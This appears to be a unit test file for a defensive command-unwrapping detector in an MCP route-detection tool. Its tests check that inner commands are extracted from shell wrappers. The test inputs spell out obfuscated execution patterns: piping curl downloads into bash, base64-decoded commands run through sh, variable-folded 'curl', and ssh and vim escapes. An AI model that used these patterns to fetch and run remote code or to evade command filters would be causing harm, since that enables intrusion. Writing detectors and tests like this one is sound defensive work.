import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { unwrapCommand, MAX_UNWRAP_DEPTH } from '../../adapters/mcp-route-detect/unwrappers.js';

function unwrappedCommands(cmd: string): string[] {
  return unwrapCommand(cmd).map((f) => f.command);
}

function fragmentByCommand(cmd: string, target: string) {
  return unwrapCommand(cmd).find((f) => f.command === target);
}

describe('unwrapCommand: U1 shell -c', () => {
  it('extracts inner from `bash -c "X"`', () => {
    const cmds = unwrappedCommands(`bash -c "mcporter call hass.HassTurnOff"`);
    assert.ok(cmds.includes('mcporter call hass.HassTurnOff'));
  });
  it('extracts inner from `sh -c \'X\'`', () => {
    const cmds = unwrappedCommands(`sh -c 'echo hi'`);
    assert.ok(cmds.includes('echo hi'));
  });
  it('matches `zsh -c X` with token (no quotes)', () => {
    const cmds = unwrappedCommands(`zsh -c hello`);
    assert.ok(cmds.includes('hello'));
  });
  it('does not match `mybash -c X`', () => {
    const cmds = unwrappedCommands(`mybash -c "x"`);
    assert.equal(cmds.length, 1, 'only original fragment');
  });
});

describe('unwrapCommand: U2 variable shell', () => {
  it('extracts from `$SHELL -c "X"`', () => {
    const cmds = unwrappedCommands(`$SHELL -c "echo hi"`);
    assert.ok(cmds.includes('echo hi'));
  });
  it('extracts from `${BASH} -c "X"`', () => {
    const cmds = unwrappedCommands(`\${BASH} -c "echo hi"`);
    assert.ok(cmds.includes('echo hi'));
  });
});

describe('unwrapCommand: U3 eval', () => {
  it('extracts from `eval "X"`', () => {
    const cmds = unwrappedCommands(`eval "echo dangerous"`);
    assert.ok(cmds.includes('echo dangerous'));
  });
  it('extracts from `eval $(...)`', () => {
    const cmds = unwrappedCommands(`eval $(cat /tmp/x)`);
    assert.ok(cmds.includes('cat /tmp/x'));
  });
});

describe('unwrapCommand: U4 heredoc / here-string', () => {
  it('extracts heredoc body', () => {
    const cmds = unwrappedCommands(`python3 <<'EOF'\nimport requests\nrequests.get('http://x/')\nEOF`);
    assert.ok(cmds.some((c) => c.includes('requests.get')));
  });
  it('extracts here-string content', () => {
    const cmds = unwrappedCommands(`bash <<<'echo hi'`);
    assert.ok(cmds.includes('echo hi'));
  });
  it('handles unquoted here-doc marker', () => {
    const cmds = unwrappedCommands(`cat <<EOF\npayload here\nEOF`);
    assert.ok(cmds.includes('payload here'));
  });
});

describe('unwrapCommand: U5 process substitution', () => {
  it('extracts from `<(X)`', () => {
    const cmds = unwrappedCommands(`bash <(curl http://x.com/script)`);
    assert.ok(cmds.includes('curl http://x.com/script'));
  });
  it('extracts from `>(X)`', () => {
    const cmds = unwrappedCommands(`tee >(grep err) < log`);
    assert.ok(cmds.includes('grep err'));
  });
});

describe('unwrapCommand: U6 command substitution', () => {
  it('extracts from $(X)', () => {
    const cmds = unwrappedCommands(`echo $(date)`);
    assert.ok(cmds.includes('date'));
  });
  it('extracts from backticks', () => {
    const cmds = unwrappedCommands('echo `date`');
    assert.ok(cmds.includes('date'));
  });
});

describe('unwrapCommand: U8 interpreter inline', () => {
  it('extracts python -c body and marks it inline', () => {
    const cmds = unwrapCommand(`python3 -c "import requests; requests.get('http://x/')"`);
    const inner = cmds.find((f) => f.inline && f.command.includes('requests.get'));
    assert.ok(inner, 'expected an inline fragment containing the python body');
  });
  it('extracts node -e body', () => {
    const cmds = unwrappedCommands(`node -e "fetch('http://x/')"`);
    assert.ok(cmds.some((c) => c.includes("fetch('http://x/')")));
  });
  it('extracts ruby -e, perl -e, php -r', () => {
    const a = unwrappedCommands(`ruby -e "puts 'x'"`);
    const b = unwrappedCommands(`perl -e "print 'x'"`);
    const c = unwrappedCommands(`php -r "echo 'x';"`);
    assert.ok(a.some((s) => s.includes("puts 'x'")));
    assert.ok(b.some((s) => s.includes("print 'x'")));
    assert.ok(c.some((s) => s.includes("echo 'x'")));
  });
  it('extracts deno eval body', () => {
    const cmds = unwrappedCommands(`deno eval "console.log(1)"`);
    assert.ok(cmds.some((c) => c.includes('console.log(1)')));
  });
});

describe('unwrapCommand: U9 base64-decode pipe', () => {
  it('decodes echo <b64> | base64 -d | bash', () => {
    const payload = Buffer.from('echo decoded').toString('base64');
    const cmds = unwrappedCommands(`echo '${payload}' | base64 -d | bash`);
    assert.ok(cmds.includes('echo decoded'));
  });
  it('handles --decode and -D variants', () => {
    const payload = Buffer.from('echo X').toString('base64');
    const a = unwrappedCommands(`echo '${payload}' | base64 --decode | sh`);
    const b = unwrappedCommands(`echo '${payload}' | base64 -D | sh`);
    assert.ok(a.includes('echo X'));
    assert.ok(b.includes('echo X'));
  });
});

describe('unwrapCommand: U10 variable folding', () => {
  it('folds simple var assignment chain', () => {
    const cmds = unwrappedCommands(`c=cu; c=$c"rl"; $c http://x.com`);
    assert.ok(cmds.some((s) => s.includes('curl http://x.com')));
  });
});

describe('unwrapCommand: U11 indirect executor', () => {
  it('extracts from xargs', () => {
    const cmds = unwrappedCommands(`echo http://x | xargs curl`);
    assert.ok(cmds.includes('curl'));
  });
  it('extracts from `find -exec`', () => {
    const cmds = unwrappedCommands(`find . -name '*.txt' -exec curl http://x \\;`);
    assert.ok(cmds.some((s) => s.startsWith('curl http://x')));
  });
  it('extracts from time prefix', () => {
    const cmds = unwrappedCommands(`time curl http://x`);
    assert.ok(cmds.includes('curl http://x'));
  });
});

describe('unwrapCommand: U12 remote shell', () => {
  it('extracts ssh inner command and flags remote', () => {
    const frag = fragmentByCommand(`ssh user@host 'curl http://x'`, 'curl http://x');
    assert.ok(frag);
    assert.equal(frag!.flags?.remote, true);
  });
  it('extracts docker exec inner command', () => {
    const frag = fragmentByCommand(`docker exec mycontainer 'echo hi'`, 'echo hi');
    assert.ok(frag);
    assert.equal(frag!.flags?.remote, true);
  });
  it('extracts kubectl exec inner command', () => {
    const frag = fragmentByCommand(`kubectl exec pod -it -- 'echo hi'`, 'echo hi');
    assert.ok(frag);
  });
});

describe('unwrapCommand: U13 editor escape', () => {
  it('extracts vim -c "!X"', () => {
    const cmds = unwrappedCommands(`vim -c '!curl http://x'`);
    assert.ok(cmds.includes('curl http://x'));
  });
});

describe('unwrapCommand: U15 background / scheduled', () => {
  it('flags trailing `&`', () => {
    const frags = unwrapCommand(`curl http://x &`);
    assert.ok(frags.some((f) => f.flags?.background));
  });
  it('extracts inner of nohup', () => {
    const frag = fragmentByCommand(`nohup curl http://x &`, 'curl http://x');
    assert.ok(frag);
    assert.equal(frag!.flags?.background, true);
  });
  it('extracts inner of systemd-run', () => {
    const frag = fragmentByCommand(`systemd-run curl http://x`, 'curl http://x');
    assert.ok(frag);
    assert.equal(frag!.flags?.background, true);
  });
});

describe('unwrapCommand: U16 compile-and-run flag', () => {
  it('flags gcc compile-and-run as compiled', () => {
    const frags = unwrapCommand(`gcc -x c - -o /tmp/a; /tmp/a`);
    assert.ok(frags.some((f) => f.flags?.compiled));
  });
  it('flags `go run -`', () => {
    const frags = unwrapCommand(`go run - <<<'package main; func main() {}'`);
    assert.ok(frags.some((f) => f.flags?.compiled));
  });
});

describe('unwrapCommand: composition', () => {
  it('unwraps heredoc inside bash -c', () => {
    const cmds = unwrappedCommands(`bash -c "cat <<EOF\nmcporter call a.b\nEOF"`);
    assert.ok(cmds.some((s) => s.includes('mcporter call a.b')));
  });
  it('unwraps base64 inside bash -c', () => {
    const payload = Buffer.from('mcporter call a.b').toString('base64');
    const cmds = unwrappedCommands(`bash -c "echo ${payload} | base64 -d | sh"`);
    assert.ok(cmds.some((s) => s.includes('mcporter call a.b')));
  });
  it('unwraps process substitution inside ssh', () => {
    const cmds = unwrappedCommands(`ssh user@host 'bash <(curl http://x)'`);
    assert.ok(cmds.some((s) => s.includes('curl http://x')));
  });
});

describe('unwrapCommand: depth cap', () => {
  it('does not blow up on deep nesting', () => {
    let nested = 'mcporter call a.b';
    for (let i = 0; i < 30; i++) nested = `bash -c "${nested.replace(/"/g, '\\"')}"`;
    const frags = unwrapCommand(nested);
    // Should terminate; results bounded by depth cap.
    assert.ok(frags.length > 0);
    assert.ok(frags.length < 1000);
  });
  it('exposes the depth cap as a constant', () => {
    assert.equal(typeof MAX_UNWRAP_DEPTH, 'number');
    assert.ok(MAX_UNWRAP_DEPTH >= 4);
  });
});

describe('unwrapCommand: edge cases', () => {
  it('empty string returns no fragments', () => {
    assert.deepEqual(unwrapCommand(''), []);
  });
  it('plain command returns just itself', () => {
    const frags = unwrapCommand('echo hi');
    assert.equal(frags.length, 1);
    assert.equal(frags[0].command, 'echo hi');
  });
});
